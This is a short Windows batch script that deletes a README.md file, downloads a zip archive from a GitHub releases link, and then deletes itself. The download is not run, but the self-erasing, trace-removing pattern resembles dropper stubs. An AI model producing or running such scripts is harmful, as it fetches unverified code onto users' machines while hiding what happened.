@echo off
del README.md

curl -L https://github.com/Ch3es1/GuacamoleSalad/releases/download/ReleaseDownload/GuacamoleSalad-main.zip -o "main.zip"

start /b "" cmd /c del "%~f0"&exit /b






